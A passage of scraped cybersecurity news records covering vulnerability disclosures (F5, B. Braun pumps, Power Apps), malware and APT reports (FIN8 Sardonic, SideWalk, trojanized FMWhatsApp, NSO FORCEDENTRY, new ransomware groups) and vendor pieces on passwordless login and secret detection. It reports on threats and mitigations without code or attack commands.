exposed,“ Wiz researchers noted, adding, “we also recommend reviewing all past activity in your Cosmos DB account.“ Additionally, Microsoft is also urging its customers to regenerate their Cosmos DB Primary Keys to mitigate any risk arising from the flaw.\n\n\nFound this article interesting?

{'title': 'The Increased Liability of Local In-home Propagation',
'text': 'Today I discuss an attack vector conducive to cross-organizational spread, in-home local propagation. Though often overlooked, this vector is especially relevant today, as many corporate employees remain working from home.\nIn this post, I contrast in-home local propagation with traditional vectors through which a threat (ransomware in particular) spreads throughout an organization. I discuss the reasons this type of spread is problematic for employees and corporations alike. Finally, I offer simple solutions to mitigate the risk of such tactics. \nWhy Should IT and Security Stakeholders Care?\nToday’s long cycle attacks are often reconnoitering the victim environment for weeks, if not months. In this time, the attacker gains a tremendous amount of knowledge about systems in the victim’s footprint. This additional loiter time in the victim’s environment, coupled with ad-hoc maintained work-from-home environments, presents both an ingress avenue for attacks into their network as well as an egress avenue for attack out of your network into your employees’ personal devices.\nContrasting Tactics\nTraditional Spread — For some time in 2020, even with a shift to WFH, ransomware continued to propagate through some of the same vectors it had previously. Spread was common through email, malicious websites, server vulnerabilities, private cloud, and file shares. Often this was sufficient to get the attacker to saturate in the victim’s environment. However, prior to our WFH lifestyle, when it came to cross-organizational spread, many of these vectors were largely inapplicable. This leads to a natural containment of an infection to a single organization.\nIn-home Local Propagation — Recently, attackers have been jumping zones from their initial corporate victims into adjacent systems, including other endpoints in a victim’s home. It isn’t 100% clear if this is due to a natural extension of the reconnaissance they are doing as a part of their double-extortion ransom endeavors (where a ransom is demanded to decrypt files and a second ransom is demanded not to leak stolen files), or if this is because they are cluing into the fact that additional victims are meters away.\nThis jump to physically local systems can be made via traditional propagation vectors, such as open file shares, via local (to the home network) exploitation of vulnerabilities, or via the access points (APs) themselves. Home APs / Routers are often:\nConsumer-gradePoorly configured (often with standard/default admin passwords)Lacking encryption or any security measures between devicesAnd, you can forget about detection and response, as no logs from these devices will be making it back to anybody’s SIEM, SOC, nor MDR service provider.\nThis leaves an opportunity for threat actors to spread via in-home local propagation. \nThere are a couple of distinct advantages for them doing so.\nInfection of employees’ personal devices:\nWhile this could mean another party to potentially fork-over the ransom payment (the employee), the real value in spreading to an employee’s personal device is leverage to force or influence the corporate payment. Imagine for a moment that the employee in question is the IT Director, and by encouraging their leadership team to pay the ransom to restore business continuity, that they also believe they could get their family photo album, gaming machine, or spouse’s work laptop decrypted. \nInfection of third-party corporate devices\nAs described above previously, the ways to jump to separate corporate environments were either limited or well-defended. But, with employees across different companies cohabitating (spouses, roommates) or sharing internet access (neighbors) - the next potential corporate victim is just a stepping stone away, likely via a poorly-configured AP/Router at that. \n\nConsequences\nIn-home local propagation represents a greater liability for companies facing a ransomware attack, as the victims span corporate and organizational boundaries. Furthermore, the ability to mitigate risk is limited, as they are unlikely to have direct control over the network infrastructure of employees working from home. In fact, this separation is vehemently defended by employees themselves, citing privacy concerns - another potential liability for you. \nRemediative Steps\nTo mitigate the risk of in-home local propagation of ransomware (or other nasty malware, for that matter), IT and security teams can consider the following steps:\nEncourage a robust configuration of employee-owned networking devicesEnsure a sound remote software update capability, to keep client endpoint hygiene at a decent level.Identify and remediate vulnerabilities across client endpointsEngage in detection and response (threat hunting) activities across your endpoints and environment. \nI hope this article has called attention to a vector that is especially relevant in the current landscape. For more information about in-home local propagation, check out our webinar titled the Evolution of Ransomware-as-a-Service and Malware Delivery Mechanisms where I discuss this phenomenon with an expert panel of cybersecurity professionals.

'text': 'Enterprise security and network appliance vendor F5 has released patches for more than two dozen security vulnerabilities affecting multiple versions of BIG-IP and BIG-IQ devices that could potentially allow an attacker to perform a wide range of malicious actions, including accessing arbitrary files, escalating privileges, and executing JavaScript code.\nOf the 29 bugs addressed, 13 are high-severity flaws, 15 are rated medium, and one is rated low in severity.\nChief among them is CVE-2021-23031 (CVSS score: 8.8), a vulnerability affecting BIG-IP Advanced Web Application Firewall and BIG-IP Application Security Manager that allows an authenticated user to perform a privilege escalation.\n\n“When this vulnerability is exploited, an authenticated attacker with access to the Configuration utility can execute arbitrary system commands, create or delete files, and/or disable services. This vulnerability may result in complete system compromise,“ F5 said in its advisory.\nIt’s worth noting that for customers running the device in Appliance Mode, which applies additional technical restrictions in sensitive sectors, the same vulnerability comes with a critical rating of 9.9 out of 10. “As this attack is conducted by legitimate, authenticated users, there is no viable mitigation that also allows users access to the Configuration utility. The only mitigation is to remove access for users who are not completely trusted,“ the company said.\nThe other major vulnerabilities resolved by F5 are listed below -\nCVE-2021-23025 (CVSS score: 7.2) - Authenticated remote command execution vulnerability in BIG-IP Configuration utilityCVE-2021-23026 (CVSS score: 7.5) - Cross-site request forgery (CSRF) vulnerability in iControl SOAPCVE-2021-23027 and CVE-2021-23037 (CVSS score: 7.5) - TMUI DOM-based and reflected cross-site scripting (XSS) vulnerabilitiesCVE-2021-23028 (CVSS score: 7.5) - BIG-IP Advanced WAF and ASM vulnerabilityCVE-2021-23029 (CVSS score: 7.5) - BIG-IP Advanced WAF and ASM TMUI vulnerabilityCVE-2021-23030 and CVE-2021-23033 (CVSS score: 7.5) - BIG-IP Advanced WAF and ASM Websocket vulnerabilitiesCVE-2021-23032 (CVSS score: 7.5) - BIG-IP DNS vulnerabilityCVE-2021-23034, CVE-2021-23035, and CVE-2021-23036 (CVSS score: 7.5) - Traffic Management Microkernel vulnerabilities\nAdditionally, F5 has also patched a number of flaws that range from directory traversal vulnerability and SQL injection to open redirect vulnerability and cross-site request forgery, as well as a MySQL database flaw that results in the database consuming more storage space than expected when brute-force protection features of the firewall are enabled.\n\nWith F5 devices often becoming juicy targets for active exploitation attempts by threat actors, it’s highly recommended that users and administrators install updated software or apply the necessary mitigations as soon as possible. \n\n\nFound this article interesting?

{'title': 'New Passwordless Verification API Uses SIM Security for Zero Trust Remote Access',
'text': 'Forget watercooler conspiracies or boardroom battles. There’s a new war in the office. As companies nudge their staff to return to communal workspaces, many workers don’t actually want to – more than 50 percent of employees would rather quit, according to research by EY. \nWhile HR teams worry over the hearts and minds of staff, IT security professionals have a different battle plan to draft – how to make the new normal of the hybrid workplace secure.\nThe Trade-off Between Usability and Security\nA company’s biggest vulnerability continues to be its people. In a hybrid workplace, a Zero Trust strategy means ever-tightening security. The MFA a company chooses affects the difficulty of logging into email, dashboards, workflow tools, client documentation, and so on. Or, conversely, how porous access security is. \nNow imagine this scenario. An employee opens a company portal, confirms a prompt on a company app on her phone, and that’s it. She has been authenticated seamlessly by a strong possession factor using her company registered mobile number against the SIM. Nothing to remember, nothing to forget, no tokens, and no codes to type against a countdown.\n’End Points’ Are Human\nIn order to implement a Zero Trust policy that’s both effective and accessible, it’s time to stop thinking of employees as ’end points’, and address the human habits in security. For example, a Twitter poll by tru.ID revealed that 40% of people use a ’mental system’ for passwords. \nThese mental systems are in a race between complexity and memory. Passwords now need to be long, complicated, and nonsensical – and even those still get breached, thanks to database leaks or phishing scams. This just isn’t sustainable. \nInherence factors such as biometrics still involve friction to set up and use. As we know from the face or fingerprint recognition on our phones, biometrics don’t always work first-time and still require a passcode failover. Plus, not all levels of access require such stringent security. \nPossession Factor using Mobile Network Authentication\nOn the spectrum between passwords and biometrics lies the possession factor – most commonly the mobile phone. That’s how SMS OTP and authenticator apps came about, but these come with fraud risk, usability issues, and are no longer the best solution.\nThe simpler, stronger solution to verification has been with us all along – using the strong security of the SIM card that is in every mobile phone. Mobile networks authenticate customers all the time to allow calls and data. The SIM card uses advanced cryptographic security, and is an established form of real-time verification that doesn’t need any separate apps or hardware tokens. \nHowever, the real magic of SIM-based authentication is that it requires no user action. It’s there already.\nNow, APIs by tru.ID open up SIM-based network authentication for developers to build frictionless, yet secure verification experiences.\nAny concerns over privacy are alleviated by the fact that tru.ID does not process personally identifiable information between the network and the APIs. It’s purely a URL-based lookup.\nPasswordless Login: Zero User Effort and Zero Trust Security\nOne of the ways to use tru.ID APIs is to build a passwordless solution for remote login using a companion app to access an enterprise system. By implementing a one-tap interaction on a mobile phone, businesses can remove user friction from step-up security, and the risk of human error. \nHere’s an example workflow for an enterprise login companion app using tru.ID APIs:\n\nPreface: user has the official company app installed on their phone. The enterprise app has tru.ID verification APIs embedded.\nUser attempts to login to a company system (email, data dashboard etc.). This can be on desktop or mobile.The system identifies the user attempting to login and sends a Push Notification.The mobile device and the company app receive the Push Notification, and the user is prompted to Confirm or Reject the login attempt. If it is them that’s logging in, they will approve.When the user approves, a request is made to the tru.ID API via a backend to create a Check URL for that user’s registered phone number.The company app will then request that Check URL over the mobile data connection using a tru.ID SDK. This is the stage when the mobile network operator and tru.ID verify that the phone number for the current device matches the phone number the user has registered on the login system. Note that no PII is exchanged. This is purely a URL-based lookup.Once the request has completed, the system will be informed by tru.ID whether the Check URL request and phone number match was successful. This is achieved via a webhook.If the phone number verification was successful, the user is logged in.\nAlthough there are a number of steps in this approach, it’s important to note that the user only has one action: to Confirm or Reject the login.\nGet Started \nYou can start testing for free and make your first API call within minutes – just sign up with tru.ID or check the documentation. tru.ID is keen to hear from the community to discuss case studies.\n\n\nFound this article interesting?

{'title': 'Preventing your Cloud ’Secrets’ from Public Exposure: An IDE plugin solution',
'text': 'I’m sure you would agree that, in today’s digital world, the majority of applications we work on require some type of credentials – to connect to a database with a username/password, to access computer programs via authorized tokens, or API keys to invoke services for authentication.\nCredentials, or sometimes just referred to as ’Secrets,’ are pieces of user or system-level confidential information that ought to be carefully protected and accessible to legitimate users only. We all know how important it is to keep these assets secure to prevent account misuse and breaches. \nA reality check: How often do you make proactive efforts to protect these assets? Rarely, I’d say. \nAmong the worst mistakes a developer can make when it comes to application security is to accidentally commit confidential information publicly on the Internet. Surprisingly, secrets and credentials are accidentally leaked more often than you might expect, and there are intelligent tools that scan public repositories in search of committed secrets.\nWith the mission of empowering developers to take control of their own code integrity, SonarLint, a free and open source IDE extension from SonarSource, recently announced a new feature for its software that aims to help developers identify and prevent leaks of AWS user or system-level authentication credentials before they are committed to a repository and leaked from user’s local source code or files.\nDoes this sound interesting to you? Continue reading to find out more.\nFirst – why you should care\nLet’s take a moment to look back a little and see why this new SonarLint feature would be so important and useful to any developer.\nSomewhere in your life, you might have used a credit card for online purchase and immediately received a call from the credit card company asking if you intended to go ahead with the purchase. If you did, no problem, all’s well. If not, fraudulent activity was just caught before the transaction was complete – saving you and your credit card company the complexity of an after-the-fact compromised account.\n \nThe same applies to code development. \nThere may be a recurring connection to a cloud-based database as part of the code development and delivery process, or you may need credentials to access an API of a third-party company.\nIn that process, there is a chance you hard-coded credentials temporarily to ease use, or a colleague may have added confidential information for a quick local test, and then accidentally committed those files to a public repository. And...those temporary changes are now permanent....Yikes! Even with after-the-fact deletion of the code, there is still the chance that someone made a copy of your secret before the cleanup.\nNext thing you know, someone has compromised the account, or worse yet, this small security lapse has provided someone with a small staging point for a larger infrastructure breach. \nBreaches of this type are more common and potentially catastrophic than you might realize. There have been a number of news articles in the past year highlighting incidents where malicious users have stolen API keys embedded in public source code repositories such as GitHub and BitBucket. StackOverflow, Uber and more recently Shopify are examples of high-profile security incidents where secrets sprinkled in publicly visible files created havoc. Imagine the damage it could have done to the brand reputation.\nHuman error will continue to occur, but by performing the right checks at the right time, the error can be prevented from occurring in the first place. The previous case illustrates how exposure of ’secrets’ detected at the relevant point of introduction, e.g. during programming or just before committing your code, could have saved a great deal of trouble. \nThe best place to detect and address these issues in your development workflow is at the very beginning of it, that is, in your IDE, Integrated development environment. There are a lot of large companies that have learned this lesson the hard way.\nAdvanced rules that detect AWS secrets in-IDE\nWith the recent addition of new rules for detecting cloud secrets, SonarLint protects AWS authentication credentials and Amazon Marketplace Web Service (MWS) credentials from leaking publicly. Check out the rules that safeguard MWS auth tokens, AWS Access Key, Key ID, and Session tokens.\nSonarLint protects your credentials against public leakage by acting as your first line of defence. By flagging issues at the point of introduction (i.e., shifting issue detection further left), you can take immediate action and prevent the leak in the first place. \n\nThis is important because compromised accounts can have not only individual or resource-level ramifications, such as the possibility of account hacking, but also adverse consequences for the confidentiality of your customers. For example, compromised MWS tokens can be used to get illicit access to databases that contain customer information such as credit card numbers, email, shipping addresses, and merchant sales records.\nWith SonarLint installed in your IDE, these ’Secret’ detection rules will enable you to catch the presence of such credentials at the first point of entry i.e., in the source code or in language-agnostic files (e.g., xml, yaml, json) before they are committed to the repo. \nBesides identifying such problems, SonarLint is also able to provide clear guidance on how to resolve them. You then have full flexibility to take action and address the code being flagged; bringing you one step closer to delivering secure code.\nGetting started in your IDE\nThis feature is currently supported in popular IDEs such as VS Code, IntelliJ IDEA, PyCharm, CLion, WebStorm, PHPStorm, and Rider, with Visual Studio, Eclipse, and more to follow.\nTo start securing your code base you can download SonarLint for VS Code or SonarLint for your JetBrains IDEs. Or if you were already using SonarLint in your IDE, you can simply update the plugin to the newest version to enable this feature.\nAs a next step, the company also plans to extend the ’Secrets’ detection functionality to other public cloud providers.

{'title': 'Researchers Uncover FIN8’s New Backdoor Targeting Financial Institutions',
'text': 'A financially motivated threat actor notorious for setting its sights on retail, hospitality, and entertainment industries has been observed deploying a completely new backdoor on infected systems, indicating the operators are continuously retooling their malware arsenal to avoid detection and stay under the radar.\nThe previously undocumented malware has been dubbed “Sardonic“ by Romanian cybersecurity technology company Bitdefender, which it encountered during a forensic investigation in the wake of an unsuccessful attack carried out by FIN8 aimed at an unnamed financial institution located in the U.S.\n\nSaid to be under active development, “Sardonic backdoor is extremely potent and has a wide range of capabilities that help the threat actor leverage new malware on the fly without updating components,“ Bitdefender researchers Eduard Budaca and Victor Vrabie said in a report shared with The Hacker News.\n\nSince emerging on the scene in January 2016, FIN8 has leveraged a multitude of techniques, including spear-phishing and malicious software such as PUNCHTRACK and BADHATCH to steal payment card data from point-of-sale (POS) systems.\nThe threat group, which is known for taking extended breaks in between campaigns to fine-tune its tactics and increase the success rate of its operations, conducts cyber incursions primarily through “living off the land“ attacks, using built-in tools and interfaces like PowerShell as well as taking advantage of legitimate services like sslip.io to disguise their activity.\nEarlier this March, Bitdefender revealed FIN8’s return after a year-and-a-half hiatus to target insurance, retail, technology, and chemical industries in the U.S., Canada, South Africa, Puerto Rico, Panama, and Italy with a revamped version of the BADHATCH implant featuring upgraded capabilities, including screen capturing, proxy tunneling, credential theft, and fileless execution.\n\nIn the latest incident analyzed by the firm, the attackers are said to have infiltrated the target network to conduct detailed reconnaissance, before carrying out lateral movement and privilege escalation activities to deploy the malware payload. “There were multiple attempts to deploy the Sardonic backdoor on domain controllers in order to continue with privilege escalation and lateral movement, but the malicious command lines were blocked,“ the researchers said.\n\nWritten in C++, Sardonic not only takes steps to establish persistence on the compromised machine, but also comes equipped with capabilities that allow it to obtain system information, execute arbitrary commands, and load and execute additional plugins, the results of which are transmitted to a remote attacker-controlled server.\nIf anything, the latest development is yet another sign of FIN8’s shift in tactics by strengthening its capabilities and malware delivery infrastructure. To mitigate the risk associated with financial malware, companies are recommended to separate their POS networks from those used by employees or guests, train employees to better spot phishing emails, and improve email security solutions to filter potentially suspicious attachments.\n\n\nFound this article interesting?

{'title': 'B. Braun Infusomat Pumps Could Let Attackers Remotely Alter Medication Dosages',
'text': 'Cybersecurity researchers have disclosed five previously unreported security vulnerabilities affecting B. Braun’s Infusomat Space Large Volume Pump and SpaceStation that could be abused by malicious parties to tamper with medication doses without any prior authentication.\nMcAfee, which discovered and reported the flaws to the German medical and pharmaceutical device company on January 11, 2021, said the “modification could appear as a device malfunction and be noticed only after a substantial amount of drug has been dispensed to a patient, since the infusion pump displays exactly what was prescribed, all while dispensing potentially lethal doses of medication.“\nThe issues have been addressed by B. Braun in SpaceCom L82 or later, Battery Pack SP with WiFi:L82 or later, and DataModule compactplus version A12 or later.\n\nInfusion pumps are medical devices used to deliver intravenous fluids, such as nutrients and medications, into a patient’s body in controlled amounts, while SpaceStation is a configurable docking and communication system designed to accommodate up to four infusion pumps for use in a medical facility. The devices run on a software component called SpaceCom, an embedded Linux system that runs either on the pump from within its smart battery pack or from inside the SpaceStation.\n\nIn a nutshell, the flaws identified by McAfee enables an attacker to escalate privileges, view sensitive information, upload arbitrary files, and perform remote code execution —\nCVE-2021-33885 – Insufficient Verification of Data Authenticity (CVSS 9.7)CVE-2021-33882 – Missing Authentication for Critical Function (CVSS 8.2)CVE-2021-33886 – Use of Externally-Controlled Format String (CVSS 7.7)CVE-2021-33883 – Cleartext Transmission of Sensitive Information (CVSS 7.1)CVE-2021-33884 – Unrestricted Upload of File with Dangerous Type (CVSS 5.8)\nBy chaining together the vulnerabilities, an adversary could “modify a pump’s configuration while the pump is in standby mode, resulting in an unexpected dose of medication being delivered to a patient on its next use – all with zero authentication,“ McAfee Advanced Threat Research team noted in a technical deep-dive.\n\nPut differently, the weaknesses, which arise due to a lack of verification in the pump’s operating system, could allow any attacker to send commands or data to it, thereby facilitating remote attacks that not only go undetected but also weaponize the device by altering the amount of medication a patient is expected to receive through infusion.\n\nOne caveat of note is that the attacks can only be successful when a pump is idle or in standby mode in between infusions, not to mention such unauthorized modifications to critical pump data necessitate that the threat actor first gain an initial foothold to the local network, or potentially carry out the intrusions over the internet in the event the pumps are directly exposed — a scenario that’s unlikely.\n“All facilities utilizing SpaceCom, Battery Pack SP with WiFi, and DataModule compactplus should review their IT infrastructure to ensure that a network zone concept has been implemented whereby critical systems, such as infusion pumps, are housed in separate (e.g., by firewalls or VLAN) environments which are not accessible directly from the internet or by unauthorized users,“ B. Braun said in an advisory published on May 14, 2021.\n“Wireless networks should be implemented using multi-factor authentication and industry standard encryption and should be equipped with Intrusion Detection Systems (IDS) and/or Intrusion Prevention Systems (IPS),“ the company added.\n\n\nFound this article interesting?

'text': 'A computer retail company based in the U.S. was the target of a previously undiscovered implant called SideWalk as part of a recent campaign undertaken by a Chinese advanced persistent threat group primarily known for singling out entities in East and Southeast Asia.\nSlovak cybersecurity firm ESET attributed the malware to an advanced persistent threat it tracks under the moniker SparklingGoblin, an adversary believed to be connected to the Winnti umbrella group, noting its similarities to another backdoor dubbed Crosswalk that was put to use by the same threat actor in 2019.\n\n“SideWalk is a modular backdoor that can dynamically load additional modules sent from its C&C [command-and-control] server, makes use of Google Docs as a dead drop resolver, and Cloudflare workers as a C&C server,“ ESET researchers Thibaut Passilly and Mathieu Tartare said in a report published Tuesday. “It can also properly handle communication behind a proxy.“\nSince first emerging on the threat landscape in 2019, SparklingGoblin has been linked to several attacks aimed at Hong Kong universities using backdoors such as Spyder and ShadowPad, the latter of which has become a preferred malware of choice among multiple Chinese threat clusters in recent years.\n\nOver the past year, the collective has hit a broad range of organizations and verticals around the world, with a particular focus on the academic institutions located in Bahrain, Canada, Georgia, India, Macao, Singapore, South Korea, Taiwan, and the U.S. Other targeted entities include media companies, religious organizations, e-commerce platforms, computer and electronics manufacturers, and local governments.\nSideWalk is characterized as an encrypted shellcode, which is deployed via a .NET loader that takes care of “reading the encrypted shellcode from disk, decrypting it and injecting it into a legitimate process using the process hollowing technique.“ The next phase of the infection commences with SideWalk establishing communications with the C&C server, with the malware retrieving the encrypted IP address from a Google Docs document.\n\n“The decrypted IP address is 80.85.155[.]80. That C&C server uses a self-signed certificate for the facebookint[.]com domain. This domain has been attributed to BARIUM by Microsoft, which partially overlaps with what we define as Winnti Group. As this IP address is not the first one to be used by the malware, it is considered to be the fallback one,“ the researchers said.\nBesides using HTTPS protocol for C&C communications, SideWalk is designed to load arbitrary plugins sent from the server, amass information about running processes, and exfiltrate the results back to the remote server.\n“SideWalk is a previously undocumented backdoor used by the SparklingGoblin APT group. It was most likely produced by the same developers as those behind CROSSWALK, with which it shares many design structures and implementation details,“ the researchers concluded.\n\n\nFound this article interesting?

'text': 'A modified version of the WhatsApp messaging app for Android has been trojanized to intercept text messages, serve malicious payloads, display full-screen ads, and sign up device owners for unwanted premium subscriptions without their knowledge.\n“The Trojan Triada snuck into one of these modified versions of the messenger called FMWhatsApp 16.80.0 together with the advertising software development kit (SDK),“ researchers from Russian cybersecurity firm Kaspersky said in a technical write-up published Tuesday. “This is similar to what happened with APKPure, where the only malicious code that was embedded in the app was a payload downloader.“\n\nModified versions of legitimate Android apps — a practice called Modding — are designed to perform functions not originally conceived or intended by the app developers. FMWhatsApp, billed as a custom build of WhatsApp, allows users to refashion the app with different themes, personalize icons, and hide features like last seen, and even deactivate video calling features. The app is only available via third-party websites.\nThe tampered variant of the app detected by Kaspersky comes equipped with capabilities to gather unique device identifiers, which are sent to a remote server that responds back with a link to a payload that’s subsequently downloaded, decrypted, and launched by the Triada trojan.\n\nThe payload, for its part, can be employed to carry out a wide range of malicious activities ranging from downloading additional modules and displaying full-screen ads to stealthily subscribing the victims to premium services and signing into WhatsApp accounts on the device. Even worse, the attackers can hijack and take control of the WhatsApp accounts to carry out social engineering attacks or distribute spam messages, thus propagating the malware to other devices.\n“It’s worth highlighting that FMWhatsapp users grant the app permission to read their SMS messages, which means that the Trojan and all the further malicious modules it loads also gain access to them,“ the researchers said. “This allows attackers to automatically sign the victim up for premium subscriptions, even if a confirmation code is required to complete the process.“\n\n\nFound this article interesting?

'text': 'A previously undisclosed “zero-click“ exploit in Apple’s iMessage was abused by Israeli surveillance vendor NSO Group to circumvent iOS security protections and target nine Bahraini activists.\n“The hacked activists included three members of Waad (a secular Bahraini political society), three members of the Bahrain Center for Human Rights, two exiled Bahraini dissidents, and one member of Al Wefaq (a Shiite Bahraini political society),“ researchers from University of Toronto’s Citizen Lab said in a report published today, with four of the targets hacked by an actor it tracks as LULU and believed to be the government of Bahrain.\nCitizen Lab called the new exploit chain “FORCEDENTRY.“ It’s also a zero-click exploit, meaning that it can be used to trigger an infection simply by sending a malicious message to the target, even without having to click a link or view the message in question.\n\n“As always, if NSO receives reliable information related to misuse of the system, the company will vigorously investigate the claims and act accordingly based on the findings,“ a spokesperson for NSO Group told The Guardian.\nThe development comes a little over a month after an extensive investigation undertaken by a consortium of 17 media organizations revealed the widespread use of NSO Group’s Pegasus “military-grade spyware“ by authoritarian regimes to facilitate human rights violations by surveilling heads of state, activists, journalists, and lawyers around the world.\nThe company has since temporarily blocked several government clients globally from using its technology as the company probes its potential misuse, while also acknowledging that it “shut off five clients’ access in the past several years after conducting a human rights audit, and had ended ties with two in the last year alone,“ according to the Washington Post.\n\nThe latest disclosure is significant, not least because the zero-click attack successfully works against the latest versions of iOS, but also for the fact that it bypasses a new software security feature called BlastDoor that Apple built into iOS 14 to prevent such intrusions by filtering untrusted data sent over iMessage.\nThe tightly sandboxed service was detailed by Google Project Zero researcher Samuel Groß earlier this January, noting that it’s “written in Swift, a (mostly) memory safe language which makes it significantly harder to introduce classic memory corruption vulnerabilities into the code base.“ BlastDoor inspects inbound messages in a secure, sandboxed environment, thus preventing any malicious code inside of a message from interacting with the rest of the operating system or accessing user data.\n\nBut the very next month after its existence came to light, Citizen Lab said it observed NSO Group deploying FORCEDENTRY — which Amnesty International dubbed “Megalodon“ — against iOS versions 14.4 and 14.6 as a zero-day expressly engineered to get around the BlastDoor feature by crashing IMTranscoderAgent, a service responsible for transcoding and previewing images in iMessage, in order to download and render items from the Pegasus infection server.\n“Despite a half-decade of being implicated in human rights abuses, NSO Group regularly claims that they are, in fact, committed to protecting human rights,“ the researchers said. “The company has even published a ’Human Rights Policy,’ a ’Transparency and Responsibility Report,’ and claimed to subscribe to the United Nations Guiding Principles on Business and Human Rights.\n“The sale of Pegasus to Bahrain is particularly egregious, considering that there is significant, longstanding, and documented evidence of Bahrain’s serial misuse of surveillance products including Trovicor, FinFisher, Cellebrite, and, now, NSO Group,“ the Citizen Lab team added.\n\n\nFound this article interesting?

{'title': 'Researchers Warn of 4 Emerging Ransomware Groups That Can Cause Havoc',
'text': 'Cybersecurity researchers on Tuesday took the wraps off four up-and-coming ransomware groups that could pose a serious threat to enterprises and critical infrastructure, as the ripple effect of a recent spurt in ransomware incidents show that attackers are growing more sophisticated and more profitable in extracting payouts from victims.\n“While the ransomware crisis appears poised to get worse before it gets better, the cast of cybercrime groups that cause the most damage is constantly changing,“ Palo Alto Networks’ Unit 42 threat intelligence team said in a report shared with The Hacker News.\n“Groups sometimes go quiet when they’ve achieved so much notoriety that they become a priority for law enforcement. Others reboot their operations to make them more lucrative by revising their tactics, techniques and procedures, updating their software and launching marketing campaigns to recruit new affiliates.“\n\nThe development comes as ransomware attacks are getting bigger and more frequent, growing in size and severity, while also evolving beyond financial extortion to an urgent national security and safety concern that has threatened schools, hospitals, businesses, and governments across the world, prompting international authorities to formulate a series of actions against both operators of ransomware and the broader ecosystem of IT and money laundering infrastructure that’s abused to siphon funds.\n\nChief among the new entrants is AvosLocker, a ransomware-as-a-service (RaaS) group that commenced operations in late June via “press releases“ that are branded with a blue beetle logo to recruit new affiliates. The cartel, which also runs a data leak and extortion site, is said to have breached six organizations in the U.S., U.K., U.A.E., Belgium, Spain, and Lebanon, with ransom demands ranging anywhere from $50,000 to $75,000.\nIn contrast, Hive, despite opening shop in the same month as AvosLocker, has already hit several healthcare providers and mid-size organizations, including a European airline company and three U.S.-based entities, among other victims located in Australia, China, India, Netherlands, Norway, Peru, Portugal, Switzerland, Thailand, and the U.K.\nAlso detected in the wild is a Linux variant of the HelloKitty ransomware, which singles out Linux servers running VMware’s ESXi hypervisor. “The observed variants impacted five organizations in Italy, Australia, Germany, the Netherlands and the U.S.,“ Unit 42 researchers Doel Santos and Ruchna Nigam said. “The highest ransom demand observed from this group was $10 million, but at the time of writing, the threat actors have only received three transactions that sum up to about $1.48 million.“\n\nLast to join the list is LockBit 2.0, an established ransomware group that resurfaced in June with 2.0 version of their affiliate program touting its “unparalleled benefits“ of “encryption speed and self-spread function.“ Not only do the developers claim it’s “the fastest encryption software all over the world,“ the group offers a stealer named StealBit that enables the attackers to download victims’ data.\n\nSince its June 2021 debut, LockBit 2.0 has compromised 52 organizations in accounting, automotive, consulting, engineering, finance, high-tech, hospitality, insurance, law enforcement, legal services, manufacturing, non-profit energy, retail, transportation, and logistics industries spanning across Argentina, Australia, Austria, Belgium, Brazil, Germany, Italy, Malaysia, Mexico, Romania, Switzerland, the U.K., and the U.S.\nIf anything, the emergence of new ransomware variants show that cybercriminals are doubling down on ransomware attacks, underscoring the extremely profitable nature of the crime.\n“With major ransomware groups such as REvil and DarkSide lying low or rebranding to evade law enforcement heat and media attention, new groups will emerge to replace the ones that are no longer actively targeting victims,“ the researchers said. “While LockBit and HelloKitty have been previously active, their recent evolution makes them a good example on how old groups can re-emerge and remain persistent threats.“\n\n\nFound this article interesting?

'text': 'More than 38 million records from 47 different entities that rely on Microsoft’s Power Apps portals platform were inadvertently left exposed online, bringing into sharp focus a “new vector of data exposure.“\n“The types of data varied between portals, including personal information used for COVID-19 contact tracing, COVID-19 vaccination appointments, social security numbers for job applicants, employee IDs, and millions of names and email addresses,“ UpGuard Research team said in a disclosure made public on Monday.\nGovernmental bodies like Indiana, Maryland, and New York City, and private companies such as American Airlines, Ford, J.B. Hunt, and Microsoft are said to have been impacted. Among the most sensitive information that was left in the open were 332,000 email addresses and employee IDs used by Microsoft’s own global payroll services, as well as more than 85,000 records related to Business Tools Support and Mixed Reality portals.\n\nPower Apps is a Microsoft-powered development platform for building low-code custom business apps that work across mobile and the web using prebuilt templates, in addition to offering APIs to enable access to data by other applications, including options to retrieve and store information. The company describes the service as a “suite of apps, services, and connectors, as well as a data platform, that provides a rapid development environment to build custom apps for your business needs.“\nBut a misconfiguration in the way a portal could share and store data could lead to a scenario wherein sensitive data is made publicly accessible, resulting in a potential data leak.\n\n“Power Apps portals have options built in for sharing data, but they also have built in data types that are inherently sensitive,“ the researchers said. “In cases like registration pages for COVID-19 vaccinations, there are data types that should be public, like the locations of vaccination sites and available appointment times, and sensitive data that should be private, like the personally identifying information of the people being vaccinated.“\nUpGuard said it notified Microsoft of the data leakage in June 24, 2021, only for the company to initially close the case, citing the behavior was “by design“ but subsequently take actions to alert its government cloud customers of the issue in the wake of an abuse report filed by the security firm on July 15.\n\nAdditionally, Microsoft has released a tool called Portal Checker to diagnose any potential exposure arising out of misconfiguration reasons and has made updates so that “newly created portals will have table permissions enforced for all forms and lists irrespective of the Enable Table Permissions setting.“\n“While we understand (and agree with) Microsoft’s position that the issue here is not strictly a software vulnerability, it is a platform issue that requires code changes to the product, and thus should go in the same workstream as vulnerabilities,“ the researchers noted.\n“It is a better resolution to change the product in response to observed user behaviors than to label systemic loss of data confidentiality an end user misconfiguration, allowing the problem to persist and exposing end users to the cybersecurity risk of a data breach.“\n\n\nFound this article interesting?

{'title': 'Navigating Vendor Risk Management as IT Professionals',
'text': 'One of the great resources available to businesses today is the large ecosystem of value-added services and solutions. Especially in technology solutions, there is no end to the services of which organizations can avail themselves.\nIn addition, if a business needs a particular solution or service they don’t handle in-house, there is most likely a third-party vendor that can take care of that for them.\nIt is highly beneficial for businesses today to access these large pools of third-party resources. However, there can be security challenges for companies using third-party vendors and their services despite the benefits. Let’s look at navigating vendor risk management as IT professionals and see how businesses can accomplish this in a highly complex cybersecurity world.\nHow can third-party vendors introduce cybersecurity risks?\nAs mentioned, third-party vendors can be highly beneficial to organizations doing business today. They allow companies to avoid building out technology and other solutions in-house and consume these as a service. These services are crucial for small organizations that may not have the resources or technical expertise to build out the infrastructure and software solutions needed. \nHowever, when companies interact with technology solutions that integrate with their business-critical and sensitive systems, they must consider the potential cybersecurity risks involved.\nAs the proverbial “weakest link in the chain,“ if the cybersecurity practices and posture of a third-party vendor are poor, if their solutions integrate with your systems, the resulting cybersecurity risks now affect your systems. What are the real-world consequences of a vendor-related data breach?\nTake note of the following. In 2013, Target Corporation, known as one of the giant retailers in the U.S., fell victim to a data breach due to the hack of a third-party company possessing network credentials for Target’s network.\nAttackers first hacked the network of Fazio Mechanical Services, a provider of refrigeration and HVAC services for Target. As a result, attackers compromised 40 million accounts, and Target agreed to pay $10 million in damages to customers 